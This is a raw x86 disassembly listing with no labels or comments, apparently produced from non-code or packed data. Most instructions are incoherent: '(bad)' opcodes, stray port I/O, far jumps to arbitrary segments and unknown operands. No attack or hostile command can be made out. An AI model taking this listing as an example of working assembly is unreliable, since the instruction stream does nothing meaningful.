  4162f0:	ss jmp 0x6605:0x439ed021
  4162f8:	sahf   
  4162f9:	neg    BYTE PTR [ecx-0x9f075c6]
  4162ff:	xchg   esp,eax
  416300:	mov    bl,0x31
  416302:	cmp    ah,cl
  416304:	mov    ds:0xc1b499b,al
  416309:	js     0x416321
  41630b:	xchg   edi,eax
  41630c:	test   al,0xb4
  41630e:	icebp  
  41630f:	xchg   DWORD PTR [edx-0x76],esi
  416312:	jmp    0xd62f2da2
  416317:	inc    esp
  416318:	popa   
  416319:	dec    eax
  41631a:	fisubr WORD PTR [ebx+0x4e3749c1]
  416320:	mov    ebp,DWORD PTR [ecx]
  416322:	or     DWORD PTR [esi],ecx
  416324:	adc    eax,0x8f3e73
  416329:	mov    ch,0xd8
  41632b:	repz jne 0x416324
  41632e:	lods   eax,DWORD PTR ds:[esi]
  41632f:	popf   
  416330:	(bad)  
  416332:	mov    edi,0x3d287f84
  416337:	xor    edx,DWORD PTR [eax-0x3]
  41633a:	cmp    eax,0x2ab1d1f6
  41633f:	xchg   esp,eax
  416340:	pop    DWORD PTR [edi]
  416342:	cs jb  0x4162c5
  416345:	xlat   BYTE PTR ds:[ebx]
  416346:	test   DWORD PTR [edx+0x352da67f],ebp
  41634c:	repnz aaa 
  41634e:	pop    ebp
  41634f:	jmp    0x288a:0x82beb563
  416356:	ins    BYTE PTR es:[edi],dx
  416357:	pop    eax
  416358:	xchg   edi,ebx
  41635a:	not    BYTE PTR [edx+0x15]
  41635d:	and    eax,0xa133a5ce
  416362:	call   0x85cf:0x8fa3e8f6
  416369:	iret   
  41636a:	or     BYTE PTR [edi-0x3ca7d993],0x63
  416371:	mov    dl,0x66
  416373:	inc    esp
  416374:	outs   dx,BYTE PTR ds:[esi]
  416375:	sahf   
  416376:	jg     0x41634d
  416378:	pop    ecx
  416379:	sti    
  41637a:	jno    0x4163f7
  41637c:	gs jo  0x416320
  41637f:	ret    
  416380:	mov    ch,0xee
  416382:	lds    esp,FWORD PTR [esi-0x46]
  416385:	xchg   esp,eax
  416386:	add    eax,0x778561cd
  41638b:	add    DWORD PTR [eax*8-0x38f33087],ebx
  416392:	mov    esi,0x33d0034c
  416397:	loop   0x4163d1
  416399:	cwde   
  41639a:	xlat   BYTE PTR ds:[ebx]
  41639b:	cmp    eax,0x35379f08
  4163a0:	or     edx,DWORD PTR [ebx-0x4e]
  4163a3:	loopne 0x41637d
  4163a5:	sahf   
  4163a6:	loope  0x41633b
  4163a8:	pop    ss
  4163a9:	stc    
  4163aa:	add    al,0x1f
  4163ac:	mov    edx,edx
  4163ae:	inc    esi
  4163af:	mov    esp,0x7ccd2a95
  4163b4:	out    dx,al
  4163b5:	out    0xde,al
  4163b7:	hlt    
  4163b8:	push   edx
  4163b9:	(bad)  
  4163ba:	shl    DWORD PTR [ecx+0x52],1
  4163bd:	jb     0x4163e9
  4163bf:	ds mov edi,0x638bc72d
  4163c5:	jno    0x41636e
  4163c7:	xchg   dh,dl
  4163c9:	pop    esp
  4163ca:	pop    edi
  4163cb:	test   BYTE PTR [esp+eax*2-0x21],0x57
  4163d0:	out    dx,al
  4163d1:	add    BYTE PTR [ebx+esi*8-0x757d9014],bh
  4163d8:	(bad)  
  4163d9:	or     ecx,DWORD PTR [ecx]
  4163db:	and    ebp,esp
  4163dd:	retf   
  4163de:	icebp  
  4163df:	test   al,0x4b
  4163e1:	or     bh,BYTE PTR cs:[ebx+edx*2]
  4163e5:	stos   BYTE PTR es:[edi],al
  4163e6:	mov    ebp,0x19c05d97
  4163eb:	jl     0x41643b
  4163ed:	shl    DWORD PTR [eax],cl
  4163ef:	inc    esi
  4163f0:	je     0x416429
  4163f2:	test   DWORD PTR [edi],ecx
  4163f4:	dec    edi
  4163f5:	ret    0x129d
  4163f8:	gs mov esp,0x5924d366
  4163fe:	mov    ch,0x79
  416400:	mov    dl,0x11
  416402:	loope  0x416401
  416404:	fist   DWORD PTR [esi-0xe]
  416407:	stos   DWORD PTR es:[edi],eax
  416408:	cli    
  416409:	ja     0x416397
  41640b:	pop    ss
  41640c:	add    edi,edi
  41640e:	call   0x6059:0xc66b6f94
  416415:	pop    ss
  416416:	inc    esi
  416417:	mov    dh,0x64
  416419:	and    bh,bh
  41641b:	pop    esi
  41641c:	sahf   
  41641d:	test   al,0x5
  41641f:	out    dx,al
  416420:	jg     0x4163e3
  416422:	arpl   WORD PTR [ebx-0x67],si
  416425:	pop    esp
  416426:	xchg   edi,eax
  416427:	or     al,0x7a
  416429:	xor    eax,0xc556c172
  41642e:	mov    edi,0x3bd7add8
  416433:	test   esi,edi
  416435:	jmp    0x5f61:0x4ef940da
  41643c:	bound  edx,QWORD PTR [ecx+eiz*1-0x2b]
  416440:	test   eax,0x7f587da9
  416445:	in     al,dx
  416446:	mov    edx,DWORD PTR ds:0x60aac52e
  41644c:	loop   0x416456
  41644e:	xchg   ebx,eax
  41644f:	call   0x5170:0x7dab7371
  416456:	hlt    
  416457:	jne    0x416490
  416459:	repnz sbb al,0x23
  41645c:	pop    ds
  41645d:	popf   
  41645e:	mov    ch,0x8d
  416460:	ss out dx,eax
  416462:	push   cs
  416463:	ret    
  416464:	iret   
  416465:	sbb    ebp,0x45120af7
  41646b:	aaa    
  41646c:	loop   0x416451
  41646e:	ss mov ecx,esp
  416471:	jae    0x4164ca
  416473:	cmp    al,0xb9
  416475:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416476:	mov    ?,WORD PTR [esi]
  416478:	fst    QWORD PTR [esi+0x51]
  41647b:	js     0x416414
  41647d:	call   0xbe6583d1
  416482:	cmp    eax,0xa29bb84
  416487:	fcomp  DWORD PTR [edx-0x5f]
  41648a:	imul   ecx,DWORD PTR [edi+0x3b],0x2bd71d42
  416491:	push   esi
  416492:	push   esi
  416493:	jns    0x416441
  416495:	cmp    bh,BYTE PTR [edx+0x63910418]
  41649b:	js     0x416466
  41649d:	adc    esi,DWORD PTR [ebx+0x4df6fe36]
  4164a3:	lods   eax,DWORD PTR ds:[esi]
  4164a4:	es aas 
  4164a6:	pop    ebp
  4164a7:	sbb    DWORD PTR [esi+0x2c3740af],ebp
  4164ad:	dec    eax
  4164ae:	pop    ss
  4164af:	jne    0x4164c7
  4164b1:	fimul  DWORD PTR [ecx+edx*8-0x164bb861]
  4164b8:	adc    al,0x21
  4164ba:	in     eax,0xb8
  4164bc:	or     al,BYTE PTR ds:0xed68a0b8
  4164c2:	inc    esi
  4164c3:	sbb    ecx,ebx
  4164c5:	sbb    DWORD PTR [ecx],edi
  4164c7:	sahf   
  4164c8:	or     eax,0x8f158a1a
  4164cd:	cli    
  4164ce:	ja     0x416503
  4164d0:	int3   
  4164d1:	(bad)  
  4164d2:	cmp    eax,0xff0250a4
  4164d7:	fcomip st,st(7)
  4164d9:	cli    
  4164da:	cmp    BYTE PTR [ebp-0x5a6e18d7],bh
  4164e0:	add    edi,DWORD PTR [esi]
  4164e2:	sar    DWORD PTR [ecx+0x11],1
  4164e5:	repnz or dh,cl
  4164e8:	mov    cl,0x42
  4164ea:	push   ds
  4164eb:	imul   edx,ebx,0xaa13cd27
  4164f1:	(bad)  
  4164f2:	fiadd  WORD PTR [ecx+edx*1]
  4164f5:	ins    BYTE PTR es:[edi],dx
  4164f6:	sbb    bl,0x49
  4164f9:	xchg   edx,eax
  4164fa:	xchg   esi,eax
  4164fb:	fwait
  4164fc:	xchg   edi,eax
  4164fd:	adc    DWORD PTR [esi],esp
  4164ff:	and    bl,BYTE PTR [edx-0x3e001f6d]
  416505:	pop    edi
  416506:	call   0xb7b2:0x1d87c7ff
  41650d:	gs xor dl,ah
  416510:	retf   0x9d3f
  416513:	and    bl,bh
  416515:	add    al,0x64
  416517:	or     al,0x5b
  416519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41651a:	inc    edx
  41651b:	push   es
  41651c:	or     BYTE PTR [eax+0x35],0x77
  416520:	xor    al,0xf6
  416522:	mov    esi,0xf5e41810
  416528:	xor    DWORD PTR [ecx+0x42],eax
  41652b:	jns    0x416504
  41652d:	cs dec edx
  41652f:	aad    0x6c
  416531:	ins    DWORD PTR es:[edi],dx
  416532:	sub    DWORD PTR fs:[edi+0x7b],esi
  416536:	cld    
  416537:	add    DWORD PTR [ecx+0x12],edi
  41653a:	mov    dh,0xf9
  41653c:	sbb    esi,DWORD PTR [ebx+0x7d]
  41653f:	jp     0x416551
  416541:	call   0x9b667114
  416546:	dec    ah
  416548:	stos   BYTE PTR es:[edi],al
  416549:	mov    dh,0xa
  41654b:	mov    ah,0x99
  41654d:	and    eax,0x5e568dd9
  416552:	dec    ebp
  416553:	loopne 0x4164d9
  416555:	fwait
  416556:	imul   ecx,DWORD PTR [edi+edx*1-0x22],0x29
  41655b:	and    bh,bh
  41655d:	mov    dl,0xf9
  41655f:	add    BYTE PTR [edx+0x6a],bh
  416562:	xchg   ecx,eax
  416563:	add    al,0x4f
  416565:	dec    esp
  416566:	int3   
  416567:	and    BYTE PTR fs:[ebp+0x2e],dh
  41656b:	std    
  41656c:	imul   DWORD PTR [ecx]
  41656e:	leave  
  41656f:	jbe    0x416592
  416571:	std    
  416572:	das    
  416573:	sbb    edx,ecx
  416575:	mov    ebx,0x520ddd62
  41657a:	mov    ecx,0x50019c80
  41657f:	add    BYTE PTR [ecx-0x1a],bl
  416582:	jns    0x416597
  416584:	push   ss
  416585:	dec    esi
  416586:	jle    0x416588
  416588:	push   ebx
  416589:	or     eax,0x34e839a8
  41658e:	ins    BYTE PTR es:[edi],dx
  41658f:	sub    DWORD PTR [esi],esp
  416591:	aad    0xaf
  416593:	jbe    0x416575
  416595:	jbe    0x41660b
  416597:	jle    0x4165bf
  416599:	mov    esi,0x70293c1f
  41659e:	arpl   WORD PTR [ecx-0xc],ax
  4165a1:	mov    dl,0x93
  4165a3:	mov    esi,0x92b384fa
  4165a8:	aas    
  4165a9:	add    eax,0x84ef0bee
  4165ae:	scas   eax,DWORD PTR es:[edi]
  4165af:	mov    edx,DWORD PTR [esi]
  4165b1:	(bad)  
  4165b2:	pop    esi
  4165b3:	mov    dl,0xe
  4165b5:	in     eax,dx
  4165b6:	mov    edx,edx
  4165b8:	addr16 adc al,0xf
  4165bb:	sar    DWORD PTR [ebp+0x65cf8a08],1
  4165c1:	cmp    al,0xf0
  4165c3:	and    al,0x4d
  4165c5:	mov    ds,WORD PTR ds:0x942e3d4
  4165cb:	push   0xa
  4165cd:	cwde   
  4165ce:	and    DWORD PTR [ebp+eiz*4+0x3002fefb],ebp
  4165d5:	loop   0x416573
  4165d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d8:	cmp    BYTE PTR [ebx-0x4],0xb3
  4165dc:	sbb    DWORD PTR [eax-0x3e0702b2],ebx
  4165e2:	sbb    DWORD PTR [eax-0x58b5c435],esp
  4165e8:	pop    ebx
  4165e9:	sar    DWORD PTR [esi+0x6af2c6d7],1
  4165ef:	aas    
  4165f0:	add    eax,0x6adf1d05
  4165f5:	adc    DWORD PTR [edx+edx*4],esp
  4165f8:	xchg   edi,eax
  4165f9:	xor    BYTE PTR [edx],0xe1
  4165fc:	cmp    eax,0x5d5c7cc4
  416601:	cmp    edx,DWORD PTR [esi]
  416603:	loopne 0x416663
  416605:	push   edx
  416606:	in     al,0xfe
  416608:	add    al,0x9d
  41660a:	mov    ch,0x12
  41660c:	sub    eax,0xaaba23e6
  416611:	lods   eax,DWORD PTR ds:[esi]
  416612:	(bad)
  416615:	mov    ebp,0xeb454f20
  41661a:	cmp    BYTE PTR [ecx+0x543f688a],ch
  416620:	mov    ecx,0x2b861db2
  416625:	inc    esi
  416626:	outs   dx,BYTE PTR ds:[esi]
  416627:	out    0x12,al
  416629:	pop    ecx
  41662a:	in     al,0x4e
  41662c:	adc    dl,BYTE PTR [esi]
  41662e:	(bad)  
  41662f:	test   BYTE PTR [ebx+0x52],0xf1
  416633:	add    BYTE PTR [eax],al
  416635:	mov    BYTE PTR [eax-0x6d3a1eb8],dl
  41663b:	xchg   esp,eax
  41663c:	outs   dx,DWORD PTR ds:[esi]
  41663d:	or     bl,BYTE PTR [ebx+0x36]
  416640:	rcl    DWORD PTR [ecx],1
  416642:	xor    esi,DWORD PTR [edx]
  416644:	and    BYTE PTR [edx],0xe7
  416647:	je     0x4166a3
  416649:	add    DWORD PTR [esi+0x42368262],esi
  41664f:	xchg   BYTE PTR [edi+0x79],ch
  416652:	out    0x9a,eax
  416654:	fisttp WORD PTR [ebx+ecx*4-0x44]
  416658:	scas   al,BYTE PTR es:[edi]
  416659:	xor    eax,0xc1361fb2
  41665e:	sub    dl,cl
  416660:	inc    BYTE PTR [esi+0x4c]
  416663:	fs std 
  416665:	dec    edi
  416666:	dec    esi
  416667:	repz cmp BYTE PTR [esi+0x524bb945],al
  41666e:	inc    ebp
  41666f:	sbb    al,0x19
  416671:	cdq    
  416672:	xor    ah,BYTE PTR [ebp-0x4a197276]
  416678:	pop    ds
  416679:	fpatan 
  41667b:	or     DWORD PTR [ecx],0xffffff93
  41667e:	add    edx,DWORD PTR [ebx-0x4]
  416681:	(bad)  
  416682:	aaa    
  416683:	sub    BYTE PTR [ebx-0x6c],ch
  416686:	jp     0x41667d
  416688:	into   
  416689:	sbb    al,0x2e
  41668b:	cmp    al,0x6d
  41668d:	add    eax,0x5c195ccc
  416692:	pop    ebx
  416693:	inc    edi
  416694:	test   eax,0x169a0757
  416699:	pop    esp
  41669a:	jno    0x4166b8
  41669c:	dec    edx
  41669d:	popf   
  41669e:	xor    BYTE PTR [edi+0x58],cl
  4166a1:	nop
  4166a2:	daa    
  4166a3:	mov    eax,ds:0xc2fdf43b
  4166a8:	pusha  
  4166a9:	xchg   esi,eax
  4166aa:	push   0x955d0d3f
  4166af:	in     eax,dx
  4166b0:	jns    0x41665f
  4166b2:	sahf   
  4166b3:	add    edi,edx
  4166b5:	xchg   esi,eax
  4166b6:	add    eax,0x7c36a048
  4166bb:	fcomp  DWORD PTR [ebx+ecx*4]
  4166be:	push   cs
  4166bf:	mov    eax,0x7f972a99
  4166c4:	push   ebx
  4166c5:	dec    edi
  4166c6:	cmp    DWORD PTR [ebp+edi*8+0x363869a3],ecx
  4166cd:	pop    ss
  4166ce:	jle    0x416715
  4166d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166d1:	pop    eax
  4166d2:	pop    edx
  4166d3:	adc    eax,0xe50813e4
  4166d8:	leave  
  4166d9:	popa   
  4166da:	pop    ebx
  4166db:	mov    eax,ds:0xf4388988
  4166e0:	mov    esp,?
  4166e2:	push   es
  4166e3:	popa   
  4166e4:	adc    al,0x15
  4166e6:	fdivr  DWORD PTR [edi]
  4166e8:	ins    BYTE PTR es:[edi],dx
  4166e9:	jo     0x416671
  4166eb:	mov    BYTE PTR ds:0x17794854,bh
  4166f1:	push   es
  4166f2:	nop
  4166f3:	inc    ebx
  4166f4:	inc    ebp
  4166f5:	not    DWORD PTR [eax+0x48d4dd7f]
  4166fb:	push   0x46f499a6
  416700:	cmc    
  416701:	pushf  
  416702:	jge    0x4166a3
  416704:	fs and ecx,edi
  416707:	adc    DWORD PTR [ebx-0x4d],0x2540a13d
  41670e:	push   es
  41670f:	jle    0x4166be
  416711:	loope  0x4166ea
  416713:	inc    edx
  416714:	fsubr  st,st(7)
  416716:	inc    eax
  416717:	inc    ebx
  416718:	sbb    al,0x51
  41671a:	retf   0x6c68
  41671d:	pop    ss
  41671e:	or     bh,al
  416720:	js     0x41677e
  416722:	jp     0x4166e2
  416724:	add    edx,DWORD PTR [esi-0x680c42d8]
  41672a:	test   al,0xf8
  41672c:	mov    edx,0x9744afed
  416731:	fs das 
  416733:	jbe    0x41672d
  416735:	js     0x41671c
  416737:	(bad)  
  416738:	dec    ebx
  416739:	out    dx,eax
  41673a:	cmp    al,0x8e
  41673c:	sub    eax,0x2664dc14
  416741:	mov    ebx,0xbe00114a
  416746:	leave  
  416747:	mov    gs,WORD PTR [edx+0x5503f580]
  41674d:	stc    
  41674e:	retf   0xe0d9
  416751:	xchg   ecx,eax
  416752:	sar    BYTE PTR [ebx],cl
  416754:	pop    ebx
  416755:	jbe    0x4166dc
  416757:	and    ebp,DWORD PTR [eax]
  416759:	push   ecx
  41675a:	cmp    DWORD PTR [edx-0x4a7552bf],esi
  416760:	mov    bl,0x12
  416762:	dec    ebx
  416763:	sub    bh,BYTE PTR [ecx-0x6f]
  416766:	ror    dl,1
  416768:	test   eax,0xce396733
  41676d:	push   ebx
  41676e:	sbb    ebx,edi
  416770:	lods   eax,DWORD PTR ds:[esi]
  416771:	inc    edi
  416772:	dec    ebp
  416773:	shr    BYTE PTR [ecx+0x13],1
  416776:	and    DWORD PTR [ebp-0x6a62602e],eax
  41677c:	xor    edi,DWORD PTR ds:0x7b61d2ad
  416782:	push   0xffffffa7
  416784:	adc    ebx,edi
  416786:	xor    DWORD PTR ds:0x90663d98,edi
  41678c:	jae    0x4167c1
  41678e:	xchg   ecx,eax
  41678f:	out    dx,eax
  416790:	xor    ah,al
  416792:	jp     0x41674c
  416794:	test   eax,0x4f2a9315
  416799:	aas    
  41679a:	add    DWORD PTR ds:0x907e3e4,ecx
  4167a0:	scas   eax,DWORD PTR es:[edi]
  4167a1:	rcr    BYTE PTR [ebx+0x62],0x8
  4167a5:	mov    eax,DWORD PTR [edi-0x6]
  4167a8:	sbb    BYTE PTR [ebx],bh
  4167aa:	rol    DWORD PTR [eax-0x33],1
  4167ad:	cmp    BYTE PTR [eax],0x12
  4167b0:	xchg   DWORD PTR [ecx+0x40],ebx
  4167b3:	das    
  4167b4:	inc    esi
  4167b5:	repnz xor eax,0xc1b2e926
  4167bb:	adc    eax,0x84cc7ce4
  4167c0:	dec    ebp
  4167c1:	jbe    0x41675a
  4167c3:	test   BYTE PTR [edi-0x2e],ch
  4167c6:	out    0x75,eax
  4167c8:	mov    ebp,0xa7483a59
  4167cd:	sub    BYTE PTR [edx-0x5e],ah
  4167d0:	rol    bh,0x14
  4167d3:	stc    
  4167d4:	fidiv  WORD PTR [ebx]
  4167d6:	xor    BYTE PTR [edi+0x9f1f3f8],cl
  4167dc:	fs push ecx
  4167de:	fld    DWORD PTR [edi]
  4167e0:	leave  
  4167e1:	inc    edi
  4167e2:	cmp    eax,0x4a6292c5
  4167e7:	rcl    BYTE PTR [ebx+eiz*2],cl
  4167ea:	pop    esi
  4167eb:	js     0x41679a
  4167ed:	add    eax,0x363fda84
  4167f2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4167f4:	out    dx,eax
  4167f5:	jmp    0x67b3359c
  4167fa:	mov    bh,0x9e
  4167fc:	icebp  
  4167fd:	adc    eax,DWORD PTR [edi+ebx*1]
  416800:	popf   
  416801:	not    BYTE PTR [edi+0x54d2ff5]
  416807:	test   bh,0x8
  41680a:	sub    BYTE PTR [ebx-0x32084af2],bh
  416810:	mov    cl,BYTE PTR [edi]
  416812:	cmp    BYTE PTR [edi-0xa],ch
  416815:	dec    ecx
  416816:	sbb    DWORD PTR [esi-0x42],ebp
  416819:	xor    ch,BYTE PTR [eax+0x7d]
  41681c:	and    dh,dh
  41681e:	sub    DWORD PTR [edx],esp
  416820:	inc    esi
  416821:	(bad)  
  416822:	jbe    0x416832
  416824:	xlat   BYTE PTR ds:[ebx]
  416825:	nop
  416826:	cmp    ah,ah
  416828:	in     al,dx
  416829:	out    0x69,al
  41682b:	lods   al,BYTE PTR ds:[esi]
  41682c:	adc    al,0xa7
  41682e:	jae    0x4167e9
  416830:	fstp   DWORD PTR [esi]
  416832:	aas    
  416833:	loop   0x4167cc
  416835:	ins    BYTE PTR es:[edi],dx
  416836:	add    al,BYTE PTR [edi+0x62]
  416839:	mov    dl,BYTE PTR [ebp+0x52]
  41683c:	stos   DWORD PTR es:[edi],eax
  41683d:	dec    esp
  41683e:	or     eax,0xbf6f035b
  416843:	loopne 0x41685c
  416845:	call   0x8cf0:0x45d50d3
  41684c:	ret    
  41684d:	fstp   TBYTE PTR [ecx]
  41684f:	or     eax,0x51c37e1
  416854:	jmp    0xa213f746
  416859:	adc    BYTE PTR [ecx],dl
  41685b:	push   eax
  41685c:	and    eax,DWORD PTR [ebx+0x6a3936b1]
  416862:	sub    eax,0x568646d1
  416867:	popa   
  416868:	cmp    bl,BYTE PTR [eax+0x5f921635]
  41686e:	popf   
  41686f:	test   ah,al
  416871:	sar    DWORD PTR [esi],0xf2
  416874:	dec    edi
  416875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416876:	mov    al,ds:0x2cf6ca4c
  41687b:	retf   0x6631
  41687e:	addr16 dec ecx
  416880:	mov    ecx,0xb3408439
  416885:	add    al,BYTE PTR ds:[esi+eax*1+0x2aab9e82]
  41688d:	(bad)  
  41688f:	enter  0xf495,0xfe
  416893:	ficom  WORD PTR [eax]
  416895:	clc    
  416896:	jmp    FWORD PTR [esi-0x238410b9]
  41689c:	xchg   esp,eax
  41689d:	mov    ebp,0x1cdf5e16
  4168a2:	fidiv  DWORD PTR [eax]
  4168a4:	(bad)  
  4168a5:	sub    ebp,DWORD PTR [eax-0x3c]
  4168a8:	cld    
  4168a9:	jns    0x416837
  4168ab:	cmp    DWORD PTR [eax+0x51],0xe5709acf
  4168b2:	dec    ecx
  4168b3:	(bad)  
  4168b4:	std    
  4168b5:	mov    ebp,0x2a4ab3a8
  4168ba:	jp     0x4168d1
  4168bc:	mov    DWORD PTR [ebp+0x75],edx
  4168bf:	cmp    eax,0xa543386c
  4168c4:	push   ds
  4168c5:	pop    es
  4168c6:	lock dec ecx
  4168c8:	xor    BYTE PTR [ebp+0x30],cl
  4168cb:	and    eax,0x9f92d6f4
  4168d0:	fldenv [edx-0x6a69b82d]
  4168d6:	push   ds
  4168d7:	adc    ebx,ecx
  4168d9:	rol    BYTE PTR [ebx-0x4],0x3b
  4168dd:	icebp  
  4168de:	adc    BYTE PTR [esi-0x7c],cl
  4168e1:	cmp    eax,0x7ba4cee4
  4168e6:	cwde   
  4168e7:	(bad)  
  4168e8:	in     al,dx
  4168e9:	sti    
  4168ea:	pop    es
  4168eb:	fiadd  WORD PTR [ecx]
  4168ed:	sub    al,0x0
  4168ef:	fwait
  4168f0:	push   esi
  4168f1:	pop    ebp
  4168f2:	push   0x7f289d5b
  4168f7:	std    
  4168f8:	fld    TBYTE PTR [ebp+0x388f7b9c]
  4168fe:	push   ebx
  4168ff:	div    ebp
  416901:	mov    BYTE PTR [edx+0x9],ah
  416904:	mov    ds:0x74a99bb8,eax
  416909:	sub    cl,BYTE PTR [ecx+0x7eee7c1c]
  41690f:	mov    esp,0xb75b8b30
  416914:	xor    esi,eax
  416916:	gs pop eax
  416918:	or     DWORD PTR [esi+0x42a4ca2a],eax
  41691e:	pop    ds
  41691f:	sar    ch,cl
  416921:	pop    ebx
  416922:	ins    BYTE PTR es:[edi],dx
  416923:	retf   
  416924:	push   ebp
  416925:	add    al,BYTE PTR [edx]
  416927:	pop    ds
  416928:	pop    ss
  416929:	or     BYTE PTR [eax],0x80
  41692c:	push   ecx
  41692d:	jle    0x4168c6
  41692f:	rcr    al,0x72
  416932:	scas   eax,DWORD PTR es:[edi]
  416933:	xchg   DWORD PTR [eax+0x5c],ebp
  416936:	mov    esp,0x843be310
  41693b:	pop    ss
  41693c:	rcr    BYTE PTR [edx+0x74],0x2a
  416940:	mov    dh,0xa6
  416942:	popa   
  416943:	jb     0x416948
  416945:	cwde   
  416946:	inc    eax
  416947:	(bad)  
  416948:	rol    dl,cl
  41694a:	ds in  eax,0x65
  41694d:	loope  0x41691c
  41694f:	xor    ebp,DWORD PTR [esi-0x1a43a475]
  416955:	dec    ebx
  416956:	adc    BYTE PTR ds:0x5c968fd6,0x76
  41695d:	push   es
  41695e:	retf   0xcc2d
  416961:	icebp  
  416962:	fiadd  DWORD PTR [edx-0x1025bbfc]
  416968:	cmp    BYTE PTR [eax-0x51],0x48
  41696c:	pop    ss
  41696d:	jecxz  0x41693d
  41696f:	(bad)  
  416970:	push   ebp
  416971:	in     al,0x3a
  416973:	aam    0xfd
  416975:	daa    
  416976:	daa    
  416977:	es sub eax,0xa2f79ae4
  41697d:	and    DWORD PTR [ebx],esi
  41697f:	ret    0x4799
  416982:	cmp    dh,bl
  416984:	out    0x28,eax
  416986:	pop    ebx
  416987:	aad    0x3b
  416989:	jno    0x4169aa
  41698b:	mov    bl,BYTE PTR [edi+0x7c]
  41698e:	adc    bh,BYTE PTR [edx+edx*1-0x46]
  416992:	sbb    eax,edx
  416994:	inc    esi
  416995:	xchg   esi,eax
  416996:	push   eax
  416997:	inc    edx
  416998:	adc    al,0xa8
  41699a:	das    
  41699b:	push   0x5bcbb11f
  4169a0:	jl     0x416a04
  4169a2:	add    DWORD PTR [esi-0x34],edx
  4169a5:	aaa    
  4169a6:	add    al,0xa1
  4169a8:	jb     0x4169cc
  4169aa:	(bad)  
  4169ab:	ffreep st(5)
  4169ad:	fdiv   QWORD PTR [edx-0xd3adc21]
  4169b3:	pop    es
  4169b4:	outs   dx,BYTE PTR ds:[esi]
  4169b5:	pop    ebp
  4169b6:	popf   
  4169b7:	into   
  4169b8:	inc    edx
  4169b9:	xchg   ebp,eax
  4169ba:	mov    BYTE PTR [ebx+0x1410e6b0],0x4e
  4169c1:	call   0x9c1138b1
  4169c6:	dec    esi
  4169c7:	imul   esi,DWORD PTR [esi-0x7e],0xb12c7217
  4169ce:	das    
  4169cf:	adc    eax,0x26571ca7
  4169d4:	das    
  4169d5:	mov    ds:0x546376ab,al
  4169da:	(bad)  
  4169dc:	outs   dx,BYTE PTR ds:[esi]
  4169dd:	outs   dx,DWORD PTR ds:[esi]
  4169de:	mov    WORD PTR [eax],fs
  4169e0:	jmp    0xd4efecb1
  4169e5:	out    dx,al
  4169e6:	sub    al,0x1c
  4169e8:	loope  0x4169ce
  4169ea:	add    DWORD PTR [esp+ebp*2-0x2e],edi
  4169ee:	pop    ebp
  4169ef:	xchg   DWORD PTR [esi-0x80],eax
  4169f2:	pop    eax
  4169f3:	loope  0x4169bc
  4169f5:	adc    esi,DWORD PTR [ecx-0x52]
  4169f8:	push   esi
  4169f9:	stos   BYTE PTR es:[edi],al
  4169fa:	sbb    edi,DWORD PTR [ebp-0x5c]
  4169fd:	stc    
  4169fe:	cmp    edi,edi
  416a00:	(bad)  
  416a01:	fmul   DWORD PTR [ecx+0x511d2618]
  416a07:	add    dl,BYTE PTR [edi-0x4e]
  416a0a:	pop    edx
  416a0b:	cmp    BYTE PTR [edx],cl
  416a0d:	dec    esp
  416a0e:	div    DWORD PTR [edi+0x1]
  416a11:	hlt    
  416a12:	call   0x7549:0xc861362a
  416a19:	inc    ebx
  416a1a:	inc    edi
  416a1b:	jbe    0x416a29
  416a1d:	xor    BYTE PTR [ebx+0x65],dl
  416a20:	xlat   BYTE PTR ds:[ebx]
  416a21:	stos   DWORD PTR es:[edi],eax
  416a22:	xchg   ebp,eax
  416a23:	scas   eax,DWORD PTR es:[edi]
  416a24:	out    dx,al
  416a25:	xchg   BYTE PTR [edx],ch
  416a27:	xlat   BYTE PTR ds:[ebx]
  416a28:	(bad)  
  416a29:	ins    DWORD PTR es:[edi],dx
  416a2a:	into   
  416a2b:	and    eax,DWORD PTR [ecx-0x74897c43]
  416a31:	into   
  416a32:	push   0xffb32225
  416a37:	aam    0x9f
  416a39:	jbe    0x4169dd
  416a3b:	shr    BYTE PTR [eax],cl
  416a3d:	cmp    DWORD PTR [ebp+0x653473ef],ebx
  416a43:	mov    al,ds:0x5e10f188
  416a48:	jne    0x416ac4
  416a4a:	push   ss
  416a4b:	or     cl,BYTE PTR [ecx+edi*8+0x2c]
  416a4f:	jge    0x416a98
  416a51:	into   
  416a52:	dec    edi
  416a53:	add    esp,0xffffffa3
  416a56:	(bad)  
  416a57:	or     al,0xf
  416a59:	push   ds
  416a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a5b:	inc    eax
  416a5c:	(bad)  
  416a5d:	cmp    eax,0x766e8474
  416a62:	imul   edx,DWORD PTR [edi],0x67b945e3
  416a68:	mov    ch,0xe9
  416a6a:	ss pushf 
  416a6c:	enter  0xd4c9,0xdb
  416a70:	cmp    esi,edi
  416a72:	call   0xd025:0xca5345db
  416a79:	mov    ah,0x26
  416a7b:	dec    ebx
  416a7c:	mov    WORD PTR [edx+0x130cd49d],?
  416a82:	pop    edi
  416a83:	lods   eax,DWORD PTR ds:[esi]
  416a84:	in     eax,dx
  416a85:	xchg   ecx,eax
  416a86:	out    dx,al
  416a87:	repnz mov WORD PTR [ecx+0x65],?
  416a8b:	or     ch,al
  416a8d:	cmp    DWORD PTR [edi],esp
  416a8f:	fld    QWORD PTR [edi-0x71]
  416a92:	stc    
  416a93:	(bad)  
  416a94:	shr    edi,cl
  416a96:	sbb    edx,DWORD PTR [ecx-0x51]
  416a99:	add    al,0x3a
  416a9b:	jo     0x416a22
  416a9d:	loop   0x416b08
  416a9f:	jecxz  0x416aac
  416aa1:	mov    eax,ds:0x2779077a
  416aa6:	mov    ebx,DWORD PTR [esi+0x38]
  416aa9:	(bad)  
  416aaa:	nop
  416aab:	sub    ebp,DWORD PTR [ebx+0xa]
  416aae:	stos   BYTE PTR es:[edi],al
  416aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab0:	aad    0x2f
  416ab2:	xchg   edi,eax
  416ab3:	shr    BYTE PTR [ebx],0xb7
  416ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab7:	xor    eax,0xe656033
  416abc:	fild   WORD PTR [ecx-0x28]
  416abf:	mov    edx,0x39d82975
  416ac4:	test   edx,edi
  416ac6:	cmp    esi,0xe14a5021
  416acc:	sub    bh,dl
